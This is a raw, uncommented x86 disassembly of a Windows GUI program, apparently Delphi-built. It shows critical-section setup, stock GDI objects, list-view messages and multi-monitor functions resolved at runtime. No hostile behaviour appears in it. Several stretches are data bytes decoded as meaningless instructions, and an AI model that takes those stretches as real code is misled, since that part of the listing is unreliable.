mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_42b5b0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_42b5e8
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax esi
call sub_42b7e0
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_42b62c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42b614
xor eax eax
push ebp
push sub_42b6cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b6d4
mov eax [ ebp - 0x4 ]
call sub_42b620
retn
mov eax 0x10
call sub_4026cc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42b6e0
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_42b6e0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42b7bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_4299e0
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_424b54
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_424a38
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_4170c4
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_424e6c
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_425214
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_42969c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b7e0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42b614
xor eax eax
push ebp
push sub_42b82b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b832
mov eax [ ebp - 0x4 ]
call sub_42b620
retn
mov esp ebp
pop ebp
retn
sub_42b832
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403128
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42b614
xor eax eax
push ebp
push sub_42b82b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b832
mov eax [ ebp - 0x4 ]
call sub_42b620
retn
mov esp ebp
pop ebp
retn
sub_42b858
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_423dac
push eax
mov eax ebx
call sub_423dac
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_42b62c
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_42b890
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b959
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b960
retn
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
call sub_403128
call sub_428654
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_40496c
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_40496c
sub_42b964
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42b468
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_42b4e4
mov cx 0x2c
mov dl 0x1
mov eax [ sub_4234f0 ]
call sub_423564
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_4234f0 ]
call sub_423564
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_4234f0 ]
call sub_423564
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b5b0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41896c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41896c
mov [ rw-data ] eax
mov ecx sub_423dbc
mov edx sub_423dcc
mov eax [ sub_422448 ]
call sub_417ec0
mov ecx r-xdata
mov edx sub_423fd4
mov eax [ r-xdata ]
call sub_417ec0
sub_42ba70
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ba95
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ba9c
retn
sub_42baac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xbb
inc edx
add [ eax + eax ] dl
add [ eax ] al
pop esi
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x45 ] ch
inc edx
add [ eax ] cl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ebp + eax * 4 - 0x78d7ffbf ] al
inc ecx
add [ eax ] dh
mov esp 0x85d80042
inc ecx
add [ esi + eax * 4 + 0x41 ] dl
add [ ebx ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
lea eax [ eax ]
les edi [ ebx + 0x42 ]
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar [ ebx + 0x80042 ] 0x1
add [ eax ] al
add [ eax + 0x70004010 ] dh
xor eax [ eax ]
jl r-xdata
pop esp
mov ebx 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x80042bb
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add al al
mov esp 0xbd240042
inc edx
add [ edi * 4 - 0x430fffbe ] al
inc edx
add [ esi ] al
add [ eax ] al
adc [ ebx + 0x33700042 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
mov ebx 0x80042
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add al al
mov esp 0x295c0042
inc eax
add [ edi * 4 - 0x430fffbe ] al
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
push esp
push ebx
je r-xdata
jb r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_418968
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
imul esi [ ebx + 0x74 ] 0xc400408d
mov ebx 0x42
mov eax edi
call sub_403128
sub_42bbd8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_42bc30
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_418968
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403128
sub_42bc7c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_42bcc0
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_42bd04
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_4185f0
mov eax esi
pop esi
pop ebx
retn
sub_42bd30
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bd55
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bd5c
retn
sub_42bd70
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42bdd0
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_42bd70
xor eax eax
jmp r-xdata
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebx
retn
mov al 0x1
sub_42bf38
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1015
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42bf54
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x101a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42bf70
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor edx edx
mov eax edi
call sub_406ae8
push eax
push esi
push 0x101e
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42bf94
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebp - 0x28 ]
push eax
push esi
push 0x102b
push ebx
call SendMessageA
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42bfc4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x20 ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x28 ]
push eax
push esi
push 0x102e
push ebx
call SendMessageA
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42bff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1030
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42c010
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c035
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c03c
retn
sub_42c048
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404368
xor eax eax
push ebp
push sub_42c107
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c10e
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404378
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42c048
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403eb8
sub_42c130
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_42c048
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42c1b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_42c048
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42c248
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_42c048
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42c1b8
sub_42c2de
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_42c048
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_42c35f
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42c048
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42c44c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_42c048
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42c520
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_42c048
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42c5f4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_42c048
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42c78f
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42c7b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c7bc
retn
sub_42c7d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c7f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c7fc
retn
sub_42c876
inc edx
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
insd
dec eax
insb
jo r-xdata
and al 0x11
inc eax
add [ ecx ] al
xchg bx ax
enter 0x42 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0042c9 ] dh
add [ eax ] al
outsb
je r-xdata
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11247265
inc eax
add [ ecx ] al
xchg ebx eax
cld
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 8 ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
0x42
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add al bh
jae r-xdata
leave
outsb
je r-xdata
jns r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0xc8b07265
inc edx
add [ ecx ] al
xchg bx ax
cld
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
adc al 0x45
dec eax
insb
jo r-xdata
outsb
je r-xdata
mov ah 0xc8
inc edx
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
0x42
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x42c930c0 ]
jo r-xdata
leave
inc edx
add [ eax + eax ] cl
add [ eax ] al
clc
popad
outsb
popad
jb r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
insb
je r-xdata
outsb
je r-xdata
imul ebp [ edi + 0x6e ] 0x1400408d
0x42
jae r-xdata
inc eax
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + ecx * 8 + 0x42 ] dh
jns r-xdata
inc edx
jo r-xdata
outsb
dec eax
insb
add [ eax + 0x42c9 ] dh
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
